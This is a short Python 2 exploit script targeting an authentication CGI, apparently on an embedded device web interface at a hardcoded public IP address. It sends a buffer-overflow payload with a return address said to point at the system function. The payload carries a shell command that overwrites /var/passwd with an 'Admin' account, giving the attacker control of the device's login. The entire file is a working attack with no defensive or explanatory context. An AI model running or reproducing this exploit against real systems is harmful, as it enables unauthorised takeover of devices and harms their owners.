# -*- coding: utf-8 -*-
__author__ = u'Дмитрий'

import urllib
import urllib2

# This exploits the auth_main.cgi with read buffer overflow exploit for v2.02
# prequisite is just to have id and password fields in params

url = 'http://62.192.234.10:8889/authentication.cgi'
junk = "A" * 1004 + "B" * 37 + "\x58\xf8\x40\x00"  # address of system function in executable
junk += "X" * 164 + 'echo  "Admin" "Admin" "0" > /var/passwd\x00' + "AAAA"
values = "id=test&password=test&test=" + junk

req = urllib2.Request(url, values)
response = urllib2.urlopen(req)
the_page = response.read()
print the_page